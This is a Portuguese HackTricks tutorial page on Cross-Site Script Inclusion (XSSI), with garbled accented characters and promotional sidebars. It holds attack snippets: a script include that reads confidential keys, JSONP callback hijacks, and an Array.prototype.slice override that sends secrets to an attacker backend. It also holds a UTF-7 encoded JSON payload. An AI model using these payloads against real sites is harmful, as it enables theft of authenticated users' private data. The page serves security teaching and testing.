# XSSI (Cross-Site Script Inclusion)

<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Participe do grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou do grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios github** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

#### As informa√ß√µes foram retiradas de [https://www.scip.ch/en/?labs.20160414](https://www.scip.ch/en/?labs.20160414)

## Informa√ß√µes B√°sicas

XSSI designa um tipo de vulnerabilidade que explora o fato de que, quando um **recurso √© inclu√≠do usando a tag `script`, o SOP n√£o se aplica**, pois os scripts precisam poder ser inclu√≠dos entre dom√≠nios. Assim, um atacante pode **ler tudo** que foi inclu√≠do usando a **tag `script`**.

Isso √© especialmente interessante quando se trata de JavaScript din√¢mico ou JSONP, quando informa√ß√µes de autoridade ambiente como cookies s√£o usadas para autentica√ß√£o. Os cookies s√£o inclu√≠dos ao solicitar um recurso de um host diferente.

### Tipos

1. JavaScript est√°tico (XSSI regular)
2. JavaScript est√°tico, que s√≥ √© acess√≠vel quando autenticado
3. JavaScript din√¢mico
4. N√£o-JavaScript

## XSSI Regular

As informa√ß√µes privadas est√£o localizadas dentro de um arquivo JS globalmente acess√≠vel, voc√™ pode detectar isso lendo arquivos, procurando palavras-chave ou usando regexps.\
Para explorar isso, basta incluir o script com informa√ß√µes privadas dentro do conte√∫do malicioso:
```markup
<script src="https://www.vulnerable-domain.tld/script.js"></script>
<script> alert(JSON.stringify(confidential_keys[0])); </script>
```
## Dynamic-JavaScript-based-XSSI e Authenticated-JavaScript-XSSI

**Informa√ß√µes confidenciais s√£o adicionadas ao script quando um usu√°rio o solicita**. Isso pode ser facilmente descoberto enviando a solicita√ß√£o **com e sem os cookies**, se **informa√ß√µes diferentes** forem recuperadas, ent√£o informa√ß√µes confidenciais podem estar contidas. Para fazer isso automaticamente, voc√™ pode usar a extens√£o do burp: [https://github.com/luh2/DetectDynamicJS](https://github.com/luh2/DetectDynamicJS).

Se a informa√ß√£o residir dentro de uma vari√°vel global, voc√™ pode explor√°-la usando o mesmo c√≥digo que para o caso anterior.\
Se os dados confidenciais forem enviados dentro de uma resposta JSONP, voc√™ pode substituir a fun√ß√£o executada para recuperar a informa√ß√£o:
```markup
<script>
//The confidential info will be inside the callback to angular.callbacks._7: angular.callbacks._7({"status":STATUS,"body":{"demographics":{"email":......}}})
var angular = function () { return 1; };
angular.callbacks = function () { return 1; };
angular.callbacks._7 = function (leaked) {
alert(JSON.stringify(leaked));
};
</script>
<script src="https://site.tld/p?jsonp=angular.callbacks._7" type="text/javascript"></script>
```
Ou voc√™ tamb√©m pode configurar uma fun√ß√£o preparada para ser executada pela resposta JSONP:
```markup
<script>
leak = function (leaked) {
alert(JSON.stringify(leaked));
};
</script>
<script src="https://site.tld/p?jsonp=leak" type="text/javascript"></script>
```
Se uma vari√°vel n√£o reside no namespace global, √†s vezes isso pode ser explorado de qualquer forma usando _prototype tampering_. Prototype tampering abusa do design do JavaScript, ou seja, quando interpreta c√≥digo, o JavaScript percorre a cadeia de prot√≥tipos para encontrar a propriedade chamada. O exemplo a seguir √© extra√≠do do artigo [The Unexpected Dangers of Dynamic JavaScript](https://www.usenix.org/system/files/conference/usenixsecurity15/sec15-paper-lekies.pdf) e demonstra como, ao sobrescrever uma fun√ß√£o relevante do tipo `Array` e acessar `this`, uma vari√°vel n√£o-global tamb√©m pode ser vazada.
```javascript
(function(){
var arr = ["secret1", "secret2", "secret3"];
// intents to slice out first entry
var x = arr.slice(1);
...
})();
```
No c√≥digo original, `slice` do tipo `Array` acessa os dados de nosso interesse. Um atacante pode, conforme descrito na cl√°usula anterior, substituir `slice` e roubar os segredos.
```javascript
Array.prototype.slice = function(){
// leaks ["secret1", "secret2", "secret3"]
sendToAttackerBackend(this);
};
```
## Non-Script-XSSI

Takeshi Terada descreve outro tipo de XSSI em seu artigo [Ataques XSSI baseados em identificador](https://www.mbsd.jp/Whitepaper/xssi.pdf). Ele conseguiu vazar arquivos Non-Script cross-origin incluindo, entre outros, arquivos CSV como fonte na tag `script`, usando os dados como nomes de vari√°veis e fun√ß√µes.

O primeiro ataque XSSI documentado publicamente foi em 2006. A entrada no blog de Jeremiah Grossman [T√©cnicas de Ataque Web Avan√ßadas usando o GMail](http://jeremiahgrossman.blogspot.ch/2006/01/advanced-web-attack-techniques-using.html) retrata um XSSI, que ao sobrescrever o construtor `Array` foi capaz de ler a agenda de endere√ßos completa de uma conta do google.

Em 2007 Joe Walker publicou [JSON n√£o √© t√£o seguro quanto as pessoas pensam](http://incompleteness.me/blog/2007/03/05/json-is-not-as-safe-as-people-think-it-is/). Ele usa a mesma ideia para roubar JSON que est√° dentro de um `Array`.

Outros ataques relacionados foram conduzidos injetando conte√∫do codificado em UTF-7 no JSON para escapar do formato JSON. Isso √© descrito por Gareth Heyes, autor do [Hackvertor](https://hackvertor.co.uk/public), na entrada de blog [Sequestro de JSON](http://www.thespanner.co.uk/2011/05/30/json-hijacking/) lan√ßada em 2011. Em um teste r√°pido, isso ainda era poss√≠vel no Microsoft Internet Explorer e Edge, mas n√£o no Mozilla Firefox ou Google Chrome.

JSON com UTF-7:
```javascript
[{'friend':'luke','email':'+ACcAfQBdADsAYQBsAGUAcgB0ACgAJwBNAGEAeQAgAHQAaABlACAAZgBvAHIAYwBlACAAYgBlACAAdwBpAHQAaAAgAHkAbwB1ACcAKQA7AFsAewAnAGoAbwBiACcAOgAnAGQAbwBuAGU-'}]
```
Incluindo o JSON na p√°gina do atacante
```markup
<script src="http://site.tld/json-utf7.json" type="text/javascript" charset="UTF-7"></script>
```
<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios github do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
